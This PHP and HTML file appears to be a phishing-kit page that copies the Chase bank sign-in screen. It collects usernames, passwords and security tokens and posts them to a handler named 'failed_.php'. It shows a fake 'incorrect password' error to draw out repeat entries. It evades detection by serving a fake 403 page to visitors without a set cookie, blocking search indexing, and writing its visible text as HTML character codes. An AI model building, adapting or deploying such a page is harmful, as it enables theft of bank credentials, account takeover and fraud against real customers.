<?php

$settings = include '../../settings/settings.php';

# Cookie

if(!isset($_COOKIE['logged_in']) || $_COOKIE['logged_in'] == "0"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

# Debug 

if($settings['debug'] == "1"){
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
  error_reporting(E_ALL);
}

if(!isset($_COOKIE['logged_in']) || $_COOKIE['logged_in'] == "0"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$settings = include '../../settings/settings.php';


$background = $settings['background'];

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en">
  <head>
    <style>
      body {
      transition: opacity ease-in 0.2s;
      }
      body[unresolved] {
        opacity: 0;
        display: block;
        overflow: hidden;
        position: relative;
      }
      .userId:focus + .userId-label {
        transform: translateY(-1em);
      }
    </style>
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow">
    <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-config" content="none">
    <title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#45;&#32;&#99;&#104;&#97;&#115;&#101;&#46;&#99;&#111;&#109;
    </title>
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="resources/img/chasefavicon.ico">
    <link rel="apple-touch-icon" sizes="152x152" href="resources/img/chase-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="120x120" href="resources/img/chase-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="resources/img/chase-touch-icon-76x76.png">
    <link rel="apple-touch-icon" href="resources/img/chase-touch-icon.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="resources/img/chase-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="resources/img/chase-touch-icon-120x120.png">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="resources/img/chase-touch-icon-76x76.png">
    <link rel="apple-touch-icon-precomposed" href="resources/img/chase-touch-icon.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-startup-image" href="#;" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
    <link rel="apple-touch-startup-image" href="#;" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
    <link rel="apple-touch-startup-image" href="#;" media="screen and (max-device-width: 320px)">
    <style>@font-face {
      font-family: Open Sans;
      font-style: normal;
      font-weight: 400;
      src: url('resources/fonts/opensans-regular.eot') format('embedded-opentype'),url('resources/fonts/opensans-regular.woff') format('woff'),url('resources/fonts/opensans-regular.ttf') format('truetype'),url('resources/fonts/opensans-regular.svg') format('svg');
      }
      @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 600;
        src: url('resources/fonts/opensans-semibold.eot') format('embedded-opentype'),url('resources/fonts/opensans-semibold.woff') format('woff'),url('resources/fonts/opensans-semibold.ttf') format('truetype'),url('resources/fonts/opensans-semibold.svg') format('svg');
      }
      @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 700;
        src: url('resources//fonts/opensans-bold.eot') format('embedded-opentype'),url('resources/fonts/opensans-bold.woff') format('woff'),url('resources/fonts/opensans-bold.ttf') format('truetype'),url('resources/fonts/opensans-bold.svg') format('svg');
      }
      @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 800;
        src: url('resources/fonts/opensans-extrabold.eot') format('embedded-opentype'),url('resources/fonts/opensans-extrabold.woff') format('woff'),url('resources/fonts/opensans-extrabold.ttf') format('truetype'),url('resources/fonts/opensans-extrabold.svg') format('svg');
      }
      @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 300;
        src: url('resources/fonts/opensans-light.eot') format('embedded-opentype'),url('resources/fonts/opensans-light.woff') format('woff'),url('resources/fonts/opensans-light.ttf') format('truetype'),url('resources/fonts/opensans-light.svg-light') format('svg');
      }
      @font-face {
        font-family: videoplayer;
        font-style: normal;
        font-weight: normal;
        src: url('resources/fonts/videoplayer.eot') format('embedded-opentype'),url('resources/fonts/videoplayer.woff') format('woff'),url('resources/fonts/videoplayer.ttf') format('truetype'),url('resources/fonts/videoplayer.svg') format('svg');
      }
      html {
        height:100%;
        background: #;fff;
      }
      @media only screen and (min-width: 768px) {
        html {
          background:#;1c4f82;
          background:-moz-linear-gradient(top,#;1c4f82 0%, #;2e6ea3 100%);
          background:-webkit-linear-gradient(top,#;1c4f82 0%,#;2e6ea3 100%);
          background:linear-gradient(to bottom,#;1c4f82 0%,#;2e6ea3 100%);
        }
      }
    </style>
    <link rel="stylesheet" href="resources/css/blue-ui.css">
    <link rel="stylesheet" href="resources/css/logon.css">
  </head>
  <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
    <script>
      document.cookie = "sw2=" + screen.width;
      document.cookie = "sh2=" + screen.height;
    </script>
    <div id="logonApp" data-is-view="true">
      <div class="homepage" tabindex="-1">
        <div id="advertisenativeapp" data-has-view="true">
          <div data-is-view="true">
            <div class="advertiseNativeApp">
            </div>
          </div>
        </div> 
        <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
          <div data-is-view="true">
            <div id="siteMessageAda" aria-live="polite">
              <h2 class="util accessible-text" id="site-messages-heading">&#89;&#111;&#117;&#32;&#104;&#97;&#118;&#101;&#32;&#110;&#111;&#32;&#109;&#111;&#114;&#101;&#32;&#115;&#105;&#116;&#101;&#32;&#97;&#108;&#101;&#114;&#116;&#115;
              </h2>
            </div> 
          </div>
        </div> 
        <div class="logon-container" id="container">
          <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
            <div class="logon header jpui transparent navigation bar" data-is-view="true">
              <a id="logoHomepageLink" href="#"> 
                <div class="chase logo">
                </div> 
                <span class="util accessible-text">&#67;&#104;&#97;&#115;&#101;&#46;&#99;&#111;&#109;&#32;&#104;&#111;&#109;&#101;&#112;&#97;&#103;&#101;
                </span>
              </a> 
            </div>
          </header> 
          <main id="logon-content" data-has-view="true">
            <div class="container logon" data-is-view="true">
              <div>
                <div id="backgroundImage"> 
                  <div class="jpui background image fixed" id="geoImage">
                    <style type="text/css">.jpui.background.image {
                      background-image: url(resources/img/<?php echo $background;?>/background.mobile.4.jpeg);
                      filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='resources/img/'<?php echo $background;?>'/background.mobile.4.jpeg', sizingMethod='scale');
                      -ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='resources/img/'<?php echo $background;?>'/background.mobile.4.jpeg', sizingMethod='scale');
                      }
                      @media (min-width:320px) {
                        .jpui.background.image{
                          background-image:url(resources/img/<?php echo $background;?>/background.mobile.4.jpeg);
                        }
                      }
                      @media (min-width:992px) {
                        .jpui.background.image{
                          background-image:url(resources/img/<?php echo $background;?>/background.tablet.4.jpeg);
                        }
                      }
                      @media (min-width:1024px) {
                        .jpui.background.image{
                          background-image:url(resources/img/<?php echo $background;?>/background.desktop.4.jpeg);
                        }
                      }
                    </style>
                  </div>
                </div>
              </div> 
              <div class="row">
                <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
                  <div class="jpui raised segment">
                    <div class="row">
                      <div class="col-xs-10 col-xs-offset-1">
                        <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">&#89;&#111;&#117;&#39;&#114;&#101;&#32;&#98;&#101;&#105;&#110;&#103;&#32;&#115;&#105;&#103;&#110;&#101;&#100;&#32;&#111;&#117;&#116;&#46;
                        </h3>
                      </div>
                    </div> 
                    <div class="row">
                      <div class="col-xs-12">
                        <div class="progress">
                          <div class="bar">
                          </div>
                        </div>
                      </div>
                    </div>
                  </div> 
                </div> 
                <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                  <div class="jpui raised segment">
                    <div id="thirdPartyAggregatorSecurityBanner">
                    </div> 
                    <div class="row">
                      <div class="col-xs-10 col-xs-offset-1">
                        <form id="login-form" method="POST" autocomplete="off" action="failed_.php" novalidate="">
                        <div id="validator-error-header" class="">
                          <div class="jpui error error inverted primary animate alert" id="logon-error" role="region" aria-labelledby="inner-logon-error">
                            <div class="icon">
                              <span id="type-icon-logon-error">
                                <i class="jpui exclamation-color icon" id="icon-type-icon-logon-error" aria-hidden="true"></i>
                              </span>
                            </div>
                            <div class="icon background"></div>
                            <div class="content wrap" id="content-logon-error">
                              <h2 class="title" tabindex="-1" id="inner-logon-error">
                                <span class="util accessible-text" id="icon-logon-error">Important: </span>&#73;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#111;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#99;&#104;&#101;&#99;&#107;&#32;&#121;&#111;&#117;&#114;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#111;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#97;&#110;&#100;&#32;&#116;&#114;&#121;&#32;&#97;&#103;&#97;&#105;&#110;&#46;
                              </h2> 
                            </div> 
                          </div>
                          </div>
                          <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
                            <div class="jpui vertical">
                              <div id="floating-user-1" class="align-label-input floating-label__container" >
                                <div class="label-wrapper">
                                  <label class="jpui fieldlabel label-alignment vertical" id="userId-label" for="userId">
                                    &#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101; 
                                  </label> 
                                </div> 
                                <div class="logon-xs-toggle" id="userId-text"> 
                                  <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="text" name="username2" required="" value="" onclick="floating()">    
                                </div> 
                              </div>  
                              <div>
                                <div>  
                                </div>
                              </div>
                            </div> 
                          </div> 
                          <div class="jpui fieldgroup logon-xs-toggle logon-floating-label" id="password">
                            <div class="jpui vertical">
                              <div id="floating-pass-1" class="align-label-input floating-label__container">
                                <div class="label-wrapper">
                                  <label class="jpui fieldlabel label-alignment vertical" id="password-label" for="password-text-input-field" aria-hidden="false">
                                    <span class="util accessible-text" id="password-label-errorLabel">
                                    </span>&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100; 
                                  </label> 
                                </div> 
                                <div class="logon-xs-toggle" id="password-text"> 
                                  <input min="0" class="jpui input logon-xs-toggle clientSideError" id="password-text-input-field" placeholder="" format="" aria-describedby="  password-input-field-label" autocomplete="off" type="password" name="password2" data-validate="password" required="" value="" onclick="floating2()">    
                                </div> 
                              </div>  
                              <div>
                                <div>  
                                </div>
                              </div>
                            </div> 
                          </div>
                          <div class="jpui fieldgroup logon-xs-toggle logon-floating-label hidden" id="securityToken">
                            <div class="jpui vertical">
                              <div id="floating-token-1" class="align-label-input floating-label__container">
                                <div class="label-wrapper">
                                  <label class="jpui fieldlabel label-alignment vertical" id="securityToken-label" for="securityToken-text-input-field" aria-hidden="false">
                                    </span>&#84;&#111;&#107;&#101;&#110;&#32;
                                    <span class="util accessible-text" id="securityToken-label-accessible-text">
                                    </span>
                                  </label> 
                                </div>
                                <div class="logon-xs-toggle" id="securityToken-text">
                                  <input min="0" class="jpui input logon-xs-toggle" id="securityToken-text-input-field" placeholder="" format="" aria-describedby="securityToken-input-field-label" autocomplete="off" maxlength="35" type="tel" name="securityToken2" required="" value="" onclick="floating3()">    
                                </div> 
                              </div>  
                              <div>
                                <div>  
                                </div>
                              </div>
                            </div> 
                          </div>
                          <div class="row logon-xs-toggle">
                            <div class="col-xs-6 rememberMe-checkbox-container">
                              <div class="jpui checkbox" id="rememberMe">
                                <div class="checkbox-flex">
                                  <div class="checkboxWrap">
                                    <input class="checkbox__input" type="checkbox" id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on" onclick="remember()"> 
                                    <i class="jpui checkmark icon check">
                                    </i>
                                  </div> 
                                  <label for="input-rememberMe"> 
                                    <span class="checkbox-label" id="label-rememberMe">&#82;&#101;&#109;&#101;&#109;&#98;&#101;&#114;&#32;&#109;&#101;&#32;
                                    </span>
                                  </label>
                                </div> 
                              </div>
                            </div> 
                            <div class="col-xs-6 token-checkbox-container">
                              <div class="jpui checkbox useToken" id="useToken">
                                <div class="checkbox-flex">
                                  <div class="checkboxWrap">
                                    <input class="checkbox__input" type="checkbox" id="input-useToken" aria-label="Shows content above. Use token" name="rsaToken" value="on" onclick="token()"> 
                                    <i class="jpui checkmark icon check" aria-hidden="true">
                                    </i>
                                  </div> 
                                  <label for="input-useToken"> 
                                    <span class="checkbox-label" id="label-useToken">&#85;&#115;&#101;&#32;&#116;&#111;&#107;&#101;&#110;&#32;
                                    </span>
                                  </label>
                                </div> 
                              </div>
                            </div>
                          </div> 
                          <script type="text/javascript">
                           function token() {
                            if (document.getElementById('input-useToken').checked){
                              var first = document.getElementById('securityToken');
                              var second = document.getElementById('input-useToken');
                              first.classList.remove('hidden');
                              second.classList.add('checkbox__input--checked');
                            } else {
                              var first = document.getElementById('securityToken');
                              var second = document.getElementById('input-useToken');
                              first.classList.add('hidden');
                              second.classList.remove('checkbox__input--checked');
                            }
                           }
                           function remember(){
                            if (document.getElementById('input-rememberMe').checked){
                              var scarletta = document.getElementById('input-rememberMe');
                              scarletta.classList.add('checkbox__input--checked');
                            } else {
                              var scarletta = document.getElementById('input-rememberMe');
                              scarletta.classList.remove('checkbox__input--checked');
                            }
                           }

                           function floating(){
                              if(document.getElementById('userId-field').click){
                                document.getElementById('floating-user-1').classList.add('floating');
                                var passfield = document.getElementById('password-text-input-field').value;
                                if (passfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-pass-1').classList.remove('floating');
                                }
                                var passfield = document.getElementById('password-text-input-field').value;
                                if (passfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-pass-1').classList.remove('floating');
                                  document.getElementById('password-text-input-field').classList.add('clientSideError');
                                  document.getElementById('password-label').classList.add('error');
                                  document.getElementById('validator-error-header').classList.remove('hidden');
                                } else if (passfield.trim() != ''){
                                  document.getElementById('password-text-input-field').classList.remove('clientSideError');
                                  document.getElementById('password-label').classList.remove('error');
                                  document.getElementById('validator-error-header').classList.add('hidden');

                                }

                                var tokenfield = document.getElementById('securityToken-text-input-field').value;
                                if(document.getElementById('input-rememberMe').checked){
                                  if (tokenfield.trim() == ''){
                                    setTimeout(200);
                                    document.getElementById('floating-token-1').classList.remove('floating');
                                    document.getElementById('securityToken-text-input-field').classList.add('clientSideError');
                                    document.getElementById('securityToken-label').classList.add('error');
                                    document.getElementById('validator-error-header').classList.remove('hidden');
                                  } else if (tokenfield.trim() != ''){
                                    document.getElementById('floating-token-1').classList.add('floating');
                                    document.getElementById('securityToken-text-input-field').classList.remove('clientSideError');
                                    document.getElementById('securityToken-label').classList.remove('error');
                                    document.getElementById('validator-error-header').classList.add('hidden');

                                  }
                                }
                              }
                            }
                            function floating2(){
                              if(document.getElementById('password-text-input-field').click){
                                var userfield = document.getElementById('userId-field').value;
                                var tokenfield = document.getElementById('securityToken-text-input-field').value;
                                if(document.getElementById('input-rememberMe').checked){
                                  if (tokenfield.trim() == ''){
                                    setTimeout(200);
                                    document.getElementById('floating-token-1').classList.remove('floating');
                                    document.getElementById('securityToken-text-input-field').classList.add('clientSideError');
                                    document.getElementById('securityToken-label').classList.add('error');
                                    document.getElementById('validator-error-header').classList.remove('hidden');

                                  } else if (tokenfield.trim() != ''){
                                    document.getElementById('floating-token-1').classList.add('floating');
                                    document.getElementById('securityToken-text-input-field').classList.remove('clientSideError');
                                    document.getElementById('securityToken-label').classList.remove('error');
                                    document.getElementById('validator-error-header').classList.add('hidden');
                                  }
                                }
                                if (userfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-user-1').classList.remove('floating');
                                  document.getElementById('userId-field').classList.add('clientSideError');
                                  document.getElementById('validator-error-header').classList.remove('hidden');
                                  document.getElementById('userId-label').classList.add('error');
                                } else if (userfield.trim() != '') {
                                  document.getElementById('userId-field').classList.remove('clientSideError');
                                  document.getElementById('userId-label').classList.remove('error');
                                  document.getElementById('validator-error-header').classList.add('hidden');
                                }
                                document.getElementById('floating-pass-1').classList.add('floating');
                              }
                            }

                            function floating3(){
                              if(document.getElementById('securityToken-text-input-field').click){
                                document.getElementById('floating-token-1').classList.add('floating');
                                var userfield = document.getElementById('userId-field').value;
                                var passfield = document.getElementById('password-text-input-field').value;
                                if (passfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-pass-1').classList.remove('floating');
                                  document.getElementById('password-text-input-field').classList.add('clientSideError');
                                  document.getElementById('password-label').classList.add('error');
                                } else if (passfield.trim() != ''){
                                  document.getElementById('password-text-input-field').classList.remove('clientSideError');
                                  document.getElementById('password-label').classList.remove('error');
                                }
                                if (userfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-user-1').classList.remove('floating');
                                  document.getElementById('userId-field').classList.add('clientSideError');
                                  document.getElementById('userId-label').classList.add('error');
                                } else if (userfield.trim() != '') {
                                  document.getElementById('userId-field').classList.remove('clientSideError');
                                  document.getElementById('userId-label').classList.remove('error');
                                }

                              } else if (! document.getElementById('securityToken-text-input-field').click){
                                var tokenfield = document.getElementById('securityToken-text-input-field').value;
                                if(tokenfield.trim() == ''){
                                  setTimeout(200);
                                  document.getElementById('floating-token-1').classList.remove('floating');
                                }
                              }
                            }
                          
                          </script>
                          <div class="row">
                            <button type="submit" id="signin-button" name="submit2" class="jpui button focus fluid primary">
                              <span class="label">&#83;&#105;&#103;&#110;&#32;&#105;&#110;
                              </span> 
                            </button>
                          </div> 
                          <div class="row">
                            <span class="jpui link" id="forgotPassword-link-wrapper">
                              <a class="link-anchor" id="forgotPassword" href="#" aria-label=" Forgot username/password? ">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#47;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;
                                <i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true">
                                </i>
                              </a>
                            </span>
                          </div> 
                          <div class="row">
                            <span class="jpui link" id="enrollment-link-wrapper">
                              <a class="link-anchor last" id="enrollment" href="#" aria-label=" Not Enrolled? Sign Up Now. ">&#78;&#111;&#116;&#32;&#69;&#110;&#114;&#111;&#108;&#108;&#101;&#100;&#63;&#32;&#83;&#105;&#103;&#110;&#32;&#85;&#112;&#32;&#78;&#111;&#119;&#46;
                                <i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true">
                                </i>
                              </a>
                            </span>
                          </div>
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </main>
        </div> <br><br><br><br>
        <footer class="logon-footer" id="logon-footer" data-has-view="true">
          <div class="footer-container" data-is-view="true" style="position: static;">
            <div class="container">
              <div class="social-links row">
                <div class="col-xs-12">
                  <span class="follow-us-text">&#70;&#111;&#108;&#108;&#111;&#119;&#32;&#117;&#115;&#58;
                  </span> 
                  <ul class="icon-links">
                    <li class="facebook">
                      <span id="requestChaseFacebook-iconanchor-wrapper">
                        <a class="jpui iconaction" href="#" id="requestChaseFacebook"> 
                          <span class="util accessible-text" id="accessible-requestChaseFacebook">&#70;&#97;&#99;&#101;&#98;&#111;&#111;&#107;&#58;&#32;&#79;&#112;&#101;&#110;&#115;&#32;&#100;&#105;&#97;&#108;&#111;&#103;
                          </span> 
                          <i class="jpui facebook icon" id="icon-requestChaseFacebook" aria-hidden="true">
                          </i>
                        </a>
                      </span>
                    </li> 
                    <li class="instagram">
                      <span id="requestChaseInstagram-iconanchor-wrapper">
                        <a class="jpui iconaction" href="#" id="requestChaseInstagram"> 
                          <span class="util accessible-text" id="accessible-requestChaseInstagram">&#73;&#110;&#115;&#116;&#97;&#103;&#114;&#97;&#109;&#58;&#32;&#79;&#112;&#101;&#110;&#115;&#32;&#100;&#105;&#97;&#108;&#111;&#103;
                          </span> 
                          <i class="jpui instagram icon" id="icon-requestChaseInstagram" aria-hidden="true">
                          </i>
                        </a>
                      </span>
                    </li> 
                    <li class="twitter">
                      <span id="requestChaseTwitter-iconanchor-wrapper">
                        <a class="jpui iconaction" href="#" id="requestChaseTwitter"> 
                          <span class="util accessible-text" id="accessible-requestChaseTwitter">&#84;&#119;&#105;&#116;&#116;&#101;&#114;&#58;&#32;&#79;&#112;&#101;&#110;&#115;&#32;&#100;&#105;&#97;&#108;&#111;&#103;
                          </span> 
                          <i class="jpui twitter icon" id="icon-requestChaseTwitter" aria-hidden="true">
                          </i>
                        </a>
                      </span>
                    </li> 
                    <li class="youtube">
                      <span id="requestChaseYouTube-iconanchor-wrapper">
                        <a class="jpui iconaction" href="#" id="requestChaseYouTube"> 
                          <span class="util accessible-text" id="accessible-requestChaseYouTube">&#89;&#111;&#117;&#84;&#117;&#98;&#101;&#58;&#32;&#79;&#112;&#101;&#110;&#115;&#32;&#100;&#105;&#97;&#108;&#111;&#103;
                          </span> 
                          <i class="jpui youtube icon" id="icon-requestChaseYouTube" aria-hidden="true">
                          </i>
                        </a>
                      </span>
                    </li> 
                    <li class="linkedin">
                      <span id="requestChaseLinkedIn-iconanchor-wrapper">
                        <a class="jpui iconaction" href="#" id="requestChaseLinkedIn"> 
                          <span class="util accessible-text" id="accessible-requestChaseLinkedIn">&#76;&#105;&#110;&#107;&#101;&#100;&#73;&#110;&#58;&#32;&#79;&#112;&#101;&#110;&#115;&#32;&#100;&#105;&#97;&#108;&#111;&#103;
                          </span> 
                          <i class="jpui linkedin icon" id="icon-requestChaseLinkedIn" aria-hidden="true">
                          </i>
                        </a>
                      </span>
                    </li>
                  </ul>
                </div>
              </div> 
              <div class="footer-links row implement-ada-features-enabled">
                <div class="col-xs-12">
                  <ul>
                    <li>
                      <span class="jpui link" id="requestContactUs-link-wrapper">
                        <a class="link-anchor" id="requestContactUs" href="#" aria-label=" Contact us ">&#67;&#111;&#110;&#116;&#97;&#99;&#116;&#32;&#117;&#115;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestPrivacyNotice-link-wrapper">
                        <a class="link-anchor" id="requestPrivacyNotice" href="#" aria-label=" Privacy ">&#80;&#114;&#105;&#118;&#97;&#99;&#121;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestSecurity-link-wrapper">
                        <a class="link-anchor" id="requestSecurity" href="#" aria-label=" Security ">&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestTermsOfUse-link-wrapper">
                        <a class="link-anchor" id="requestTermsOfUse" href="#" aria-label=" Terms of use ">&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#117;&#115;&#101;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestAccessibility-link-wrapper">
                        <a class="link-anchor" id="requestAccessibility" href="#" aria-label=" Accessibility ">&#65;&#99;&#99;&#101;&#115;&#115;&#105;&#98;&#105;&#108;&#105;&#116;&#121;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper">
                        <a class="link-anchor" id="requestMortgageLoanOriginators" href="#" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">&#83;&#65;&#70;&#69;&#32;&#65;&#99;&#116;&#58;&#32;&#67;&#104;&#97;&#115;&#101;&#32;&#77;&#111;&#114;&#116;&#103;&#97;&#103;&#101;&#32;&#76;&#111;&#97;&#110;&#32;&#79;&#114;&#105;&#103;&#105;&#110;&#97;&#116;&#111;&#114;&#115;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper">
                        <a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="#" aria-label=" Fair Lending ">&#70;&#97;&#105;&#114;&#32;&#76;&#101;&#110;&#100;&#105;&#110;&#103;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestAboutChase-link-wrapper">
                        <a class="link-anchor" id="requestAboutChase" href="#" aria-label=" About Chase ">&#65;&#98;&#111;&#117;&#116;&#32;&#67;&#104;&#97;&#115;&#101;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestJpMorgan-link-wrapper">
                        <a class="link-anchor" id="requestJpMorgan" href="#" aria-label=" J.P. Morgan ">&#74;&#46;&#80;&#46;&#32;&#77;&#111;&#114;&#103;&#97;&#110;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestJpMorganChaseCo-link-wrapper">
                        <a class="link-anchor" id="requestJpMorganChaseCo" href="#" aria-label=" JPMorgan Chase &amp; &#67;&#111;&#46; ">&#74;&#80;&#77;&#111;&#114;&#103;&#97;&#110;&#32;&#67;&#104;&#97;&#115;&#101; &amp; &#67;&#111;&#46;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestCareers-link-wrapper">
                        <a class="link-anchor" id="requestCareers" href="#" aria-label=" Careers ">&#67;&#97;&#114;&#101;&#101;&#114;&#115;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestEspanol-link-wrapper">
                        <a class="link-anchor" id="requestEspanol" href="#" aria-label=" Español ">&#69;&#115;&#112;&#97;&#241;&#111;&#108;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestChaseCanada-link-wrapper">
                        <a class="link-anchor" id="requestChaseCanada" href="#" aria-label=" Chase Canada ">&#67;&#104;&#97;&#115;&#101;&#32;&#67;&#97;&#110;&#97;&#100;&#97;
                        </a>
                      </span>
                    </li> 
                    <li>
                      <span class="jpui link" id="requestSiteMap-link-wrapper">
                        <a class="link-anchor" id="requestSiteMap" href="#" aria-label=" Site map ">&#83;&#105;&#116;&#101;&#32;&#109;&#97;&#112;
                        </a>
                      </span>
                    </li> 
                    <li>&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;
                    </li> 
                    <li>
                      <i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel" aria-hidden="true">
                      </i> &#69;&#113;&#117;&#97;&#108;&#32;&#72;&#111;&#117;&#115;&#105;&#110;&#103;&#32;&#76;&#101;&#110;&#100;&#101;&#114;
                    </li> 
                    <li class="copyright-label">&#169;&#32;&#50;&#48;&#50;&#49;&#32;&#74;&#80;&#77;&#111;&#114;&#103;&#97;&#110;&#32;&#67;&#104;&#97;&#115;&#101; &amp; 
                    </li>
                  </ul>
                </div>
              </div> 
              <div class="row galaxy-footer">
                <div class="col-xs-10 col-xs-offset-1">
                  <p class="NOTE">
                    <span>
                    </span>
                    <br> 
                    <span class="copyright-label">&#169;&#32;&#50;&#48;&#50;&#49;&#32;&#74;&#80;&#77;&#111;&#114;&#103;&#97;&#110;&#32;&#67;&#104;&#97;&#115;&#101; &amp; &#67;&#111;&#46;
                    </span>
                  </p> 
                  <p>
                    <span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper">
                      <a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="#" aria-label=" Privacy ">&#80;&#114;&#105;&#118;&#97;&#99;&#121;
                        <i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true">
                        </i>
                      </a>
                    </span>
                  </p> 
                  <p>
                    <span class="jpui link" id="galaxyRequestAccessibility-link-wrapper">
                      <a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="#" aria-label=" Accessibility ">&#65;&#99;&#99;&#101;&#115;&#115;&#105;&#98;&#105;&#108;&#105;&#116;&#121;
                        <i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true">
                        </i>
                      </a>
                    </span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </footer>
      </div> 
      <div id="languageSupportDisclaimer">
      </div> 
      <div id="overlay" data-has-view="true">
      </div> 
      <div class="overlay">
      </div> 
      <div id="signoutModal">
      </div> 
      <div id="siteExitWarning">
      </div> 
      <div id="serviceErrorModal">
      </div> 
      <div id="sessionTimeoutModal">
      </div>
    </div>
    <script src="text/javascript" src="resources/js/jquery.min.js"></script>
  </body>
</html>
